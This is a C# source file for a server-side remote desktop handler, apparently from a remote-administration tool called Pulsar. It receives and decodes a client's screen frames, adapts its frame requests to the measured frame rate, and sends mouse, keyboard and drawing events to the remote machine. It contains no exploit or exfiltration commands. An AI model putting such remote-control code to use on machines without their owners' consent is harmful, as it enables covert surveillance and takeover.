using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.RemoteDesktop;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Common.Video.Codecs;
using Pulsar.Server.Networking;
using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote desktop.
    /// </summary>
    public class RemoteDesktopHandler : MessageProcessorBase<Bitmap>, IDisposable
    {
        /// <summary>
        /// States if the client is currently streaming desktop frames.
        /// </summary>
        public bool IsStarted { get; private set; }

        /// <summary>
        /// Gets or sets whether the remote desktop is using buffered mode.
        /// </summary>
        public bool IsBufferedMode { get; set; } = true;

        private readonly object _syncLock = new object();
        private readonly object _sizeLock = new object();

        private Size _localResolution;

        /// <summary>
        /// Local resolution used to scale mouse/drawing coordinates.
        /// Thread-safe.
        /// </summary>
        public Size LocalResolution
        {
            get
            {
                lock (_sizeLock)
                {
                    return _localResolution;
                }
            }
            set
            {
                lock (_sizeLock)
                {
                    _localResolution = value;
                }
            }
        }

        public delegate void DisplaysChangedEventHandler(object sender, int value);

        /// <summary>
        /// Raised when the client display configuration changes.
        /// </summary>
        public event DisplaysChangedEventHandler DisplaysChanged;

        private void OnDisplaysChanged(int value)
        {
            SynchronizationContext.Post(val =>
            {
                var handler = DisplaysChanged;
                if (handler != null)
                    handler(this, (int)val);
            }, value);
        }

        private readonly Client _client;
        private UnsafeStreamCodec _codec;

        // Buffered frame request logic
        private readonly int _initialFramesRequested = 20;
        private readonly int _defaultFrameRequestBatch = 15;
        private int _pendingFrames;

        // single gate for request scheduling (replaces semaphore + _isRequestingFrames)
        private int _requestInFlight = 0;

        // Stats / FPS
        private readonly Stopwatch _performanceMonitor = new Stopwatch();
        private int _framesReceivedForStats;
        private double _estimatedFps;
        private readonly ConcurrentQueue<long> _frameTimestamps = new ConcurrentQueue<long>();
        private readonly int _fpsCalculationWindow = 10;

        private long _accumulatedFrameBytes;
        private int _frameBytesSamples;
        private long _lastFrameBytes;

        /// <summary>
        /// Size in bytes of the most recently received compressed frame.
        /// </summary>
        public long LastFrameSizeBytes => Interlocked.Read(ref _lastFrameBytes);

        /// <summary>
        /// Average compressed frame size in bytes across the current streaming session.
        /// </summary>
        public double AverageFrameSizeBytes
        {
            get
            {
                long total = Interlocked.Read(ref _accumulatedFrameBytes);
                int count = Volatile.Read(ref _frameBytesSamples);
                return count > 0 ? (double)total / count : 0.0;
            }
        }

        private float _lastReportedFps = -1f;

        /// <summary>
        /// Current FPS: prefers client-reported, falls back to estimated FPS.
        /// </summary>
        public float CurrentFps => _lastReportedFps > 0 ? _lastReportedFps : (float)_estimatedFps;

        public RemoteDesktopHandler(Client client) : base(true)
        {
            _client = client ?? throw new ArgumentNullException(nameof(client));
            _performanceMonitor.Start();
        }

        public override bool CanExecute(IMessage message) =>
            message is GetDesktopResponse || message is GetMonitorsResponse;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            try
            {
                if (message is GetDesktopResponse d)
                {
                    Execute(sender, d);
                }
                else if (message is GetMonitorsResponse m)
                {
                    Execute(sender, m);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"RemoteDesktopHandler.Execute error: {ex}");
            }
        }

        private void ClearTimeStamps()
        {
            long dummy;
            while (_frameTimestamps.TryDequeue(out dummy)) { }
        }

        /// <summary>
        /// Begins receiving frames from the client using the specified quality and display.
        /// </summary>
        public void BeginReceiveFrames(int quality, int display, bool useGPU)
        {
            lock (_syncLock)
            {
                IsStarted = true;

                if (_codec != null)
                {
                    try { _codec.Dispose(); }
                    catch { }
                    _codec = null;
                }

                _pendingFrames = _initialFramesRequested;
                _requestInFlight = 0;

                ClearTimeStamps();
                _framesReceivedForStats = 0;
                _performanceMonitor.Restart();
            }

            _client.Send(new GetDesktop
            {
                CreateNew = true,
                Quality = quality,
                DisplayIndex = display,
                Status = RemoteDesktopStatus.Start,
                UseGPU = useGPU,
                IsBufferedMode = IsBufferedMode,
                FramesRequested = _initialFramesRequested
            });
        }

        /// <summary>
        /// Ends receiving frames from the client.
        /// </summary>
        public void EndReceiveFrames()
        {
            lock (_syncLock)
            {
                IsStarted = false;
            }

            Interlocked.Exchange(ref _pendingFrames, 0);
            Interlocked.Exchange(ref _requestInFlight, 0);

            Debug.WriteLine("Remote desktop session stopped");
            _client.Send(new GetDesktop { Status = RemoteDesktopStatus.Stop });
        }

        /// <summary>
        /// Refreshes the available displays of the client.
        /// </summary>
        public void RefreshDisplays()
        {
            Debug.WriteLine("Refreshing displays");
            _client.Send(new GetMonitors());
        }

        public void SendMouseEvent(MouseAction mouseAction, bool isMouseDown, int x, int y, int displayIndex)
        {
            UnsafeStreamCodec codec;
            Size localRes;

            lock (_syncLock)
            {
                codec = _codec;
            }

            if (codec == null)
                return;

            localRes = LocalResolution;
            if (localRes.Width <= 0 || localRes.Height <= 0)
                return;

            int remoteX = x * codec.Resolution.Width / localRes.Width;
            int remoteY = y * codec.Resolution.Height / localRes.Height;

            _client.Send(new DoMouseEvent
            {
                Action = mouseAction,
                IsMouseDown = isMouseDown,
                X = remoteX,
                Y = remoteY,
                MonitorIndex = displayIndex
            });
        }

        public void SendKeyboardEvent(byte keyCode, bool keyDown)
        {
            _client.Send(new DoKeyboardEvent { Key = keyCode, KeyDown = keyDown });
        }

        public void SendDrawingEvent(int x, int y, int prevX, int prevY,
            int strokeWidth, int colorArgb, bool isEraser, bool isClearAll, int displayIndex)
        {
            UnsafeStreamCodec codec;
            Size localRes;

            lock (_syncLock)
            {
                codec = _codec;
            }

            if (codec == null || !IsStarted)
                return;

            localRes = LocalResolution;
            if (localRes.Width <= 0 || localRes.Height <= 0)
                return;

            int remoteX = x * codec.Resolution.Width / localRes.Width;
            int remoteY = y * codec.Resolution.Height / localRes.Height;
            int remotePrevX = prevX * codec.Resolution.Width / localRes.Width;
            int remotePrevY = prevY * codec.Resolution.Height / localRes.Height;

            _client.Send(new DoDrawingEvent
            {
                X = remoteX,
                Y = remoteY,
                PrevX = remotePrevX,
                PrevY = remotePrevY,
                StrokeWidth = strokeWidth,
                ColorArgb = colorArgb,
                IsEraser = isEraser,
                IsClearAll = isClearAll,
                MonitorIndex = displayIndex
            });
        }

        private void EnsureLocalResolutionInitialized(Size fallbackSize)
        {
            if (fallbackSize.Width <= 0 || fallbackSize.Height <= 0)
                return;

            var current = LocalResolution;
            if (current.Width <= 0 || current.Height <= 0)
            {
                LocalResolution = fallbackSize;
            }
        }

        /// <summary>
        /// Schedules a new batch of frame requests in a safe, single-gated way.
        /// </summary>
        private void RequestMoreFrames(bool highPriority)
        {
            if (!IsStarted)
                return;

            // only one request builder at a time
            if (Interlocked.CompareExchange(ref _requestInFlight, 1, 0) != 0)
                return;

            Task.Run(() =>
            {
                try
                {
                    if (!IsStarted)
                        return;

                    int batchSize = _defaultFrameRequestBatch;

                    // adaptive only when not hard-failsafe
                    if (!highPriority)
                    {
                        double fps = _estimatedFps;
                        if (fps > 40)
                            batchSize = 20;
                        else if (fps > 30)
                            batchSize = 15;
                        else if (fps > 20)
                            batchSize = 10;
                        else if (fps > 10)
                            batchSize = 5;
                        else
                            batchSize = 3;
                    }

                    UnsafeStreamCodec codecSnapshot;
                    lock (_syncLock)
                    {
                        codecSnapshot = _codec;
                    }

                    if (codecSnapshot == null || !IsStarted)
                        return;

                    Interlocked.Add(ref _pendingFrames, batchSize);

                    Debug.WriteLine(
                        $"Requesting {batchSize} more frames (highPriority={highPriority}, est FPS={_estimatedFps:F1})");

                    _client.Send(new GetDesktop
                    {
                        CreateNew = false,
                        Quality = codecSnapshot.ImageQuality,
                        DisplayIndex = codecSnapshot.Monitor,
                        Status = RemoteDesktopStatus.Continue,
                        IsBufferedMode = true,
                        FramesRequested = batchSize
                    });
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("RequestMoreFrames error: " + ex);
                }
                finally
                {
                    Interlocked.Exchange(ref _requestInFlight, 0);
                }
            });
        }

        // ==============================
        //   MAIN FRAME HANDLER
        // ==============================
        private void Execute(ISender client, GetDesktopResponse message)
        {
            if (!IsStarted)
                return;

            // FPS from client
            if (message.FrameRate > 0 && Math.Abs(message.FrameRate - _lastReportedFps) > 0.01f)
            {
                _lastReportedFps = message.FrameRate;
                Debug.WriteLine($"Client-reported FPS updated: {_lastReportedFps}");
            }

            // Account frame size stats (compressed)
            if (message.Image != null && message.Image.Length > 0)
            {
                long size = message.Image.LongLength;
                Interlocked.Exchange(ref _lastFrameBytes, size);
                Interlocked.Add(ref _accumulatedFrameBytes, size);
                Interlocked.Increment(ref _frameBytesSamples);
            }

            UnsafeStreamCodec codecSnapshot;
            bool shouldDecode;

            lock (_syncLock)
            {
                // Validate incoming image
                if (!IsStarted || message.Image == null || message.Image.Length == 0)
                {
                    Interlocked.Decrement(ref _pendingFrames);
                    return;
                }

                // Recreate codec if necessary
                if (_codec == null ||
                    _codec.ImageQuality != message.Quality ||
                    _codec.Monitor != message.Monitor ||
                    _codec.Resolution != message.Resolution)
                {
                    if (_codec != null)
                    {
                        try { _codec.Dispose(); }
                        catch { }
                    }

                    _codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution);
                    Debug.WriteLine(
                        $"RemoteDesktop codec reinitialized: Q={message.Quality}, M={message.Monitor}, Res={message.Resolution}");
                }

                codecSnapshot = _codec;
                shouldDecode = codecSnapshot != null;
            }

            if (!shouldDecode || codecSnapshot == null)
            {
                Interlocked.Decrement(ref _pendingFrames);
                return;
            }

            Bitmap decoded = null;

            try
            {
                using (var ms = new MemoryStream(message.Image, false))
                {
                    decoded = codecSnapshot.DecodeData(ms);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error decoding frame: {ex.Message}");
            }
            finally
            {
                message.Image = null;
            }

            if (!IsStarted)
            {
                if (decoded != null) decoded.Dispose();
                Interlocked.Decrement(ref _pendingFrames);
                return;
            }

            if (decoded != null)
            {
                EnsureLocalResolutionInitialized(decoded.Size);

                // Count frame for stats
                _framesReceivedForStats++;
                if (_performanceMonitor.ElapsedMilliseconds >= 1000)
                {
                    double seconds = _performanceMonitor.ElapsedMilliseconds / 1000.0;
                    if (seconds > 0.001)
                    {
                        _estimatedFps = _framesReceivedForStats / seconds;
                    }

                    Debug.WriteLine(
                        $"Estimated FPS: {_estimatedFps:F1}, Client FPS: {(_lastReportedFps > 0 ? _lastReportedFps.ToString("F1") : "N/A")}, Frames (stat window): {_framesReceivedForStats}");

                    _framesReceivedForStats = 0;
                    _performanceMonitor.Restart();
                }

                long ts = Stopwatch.GetTimestamp();
                _frameTimestamps.Enqueue(ts);
                while (_frameTimestamps.Count > _fpsCalculationWindow &&
                       _frameTimestamps.TryDequeue(out ts)) { }

                // Push frame to UI
                OnReport(decoded);
            }
            else
            {
                Debug.WriteLine("Decoded frame was null.");
            }

            // Decrease pending and decide on new requests
            int remaining = Interlocked.Decrement(ref _pendingFrames);
            if (!IsStarted)
                return;

            // Hard failsafe: never allow streaming to stall
            if (remaining <= 0)
            {
                RequestMoreFrames(true);
            }
            else if (IsBufferedMode &&
                     (message.IsLastRequestedFrame || remaining <= 8))
            {
                RequestMoreFrames(false);
            }
        }

        private void Execute(ISender client, GetMonitorsResponse message)
        {
            OnDisplaysChanged(message.Number);
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!disposing)
                return;

            lock (_syncLock)
            {
                IsStarted = false;

                if (_codec != null)
                {
                    try { _codec.Dispose(); }
                    catch { }
                    _codec = null;
                }
            }
        }
    }
}
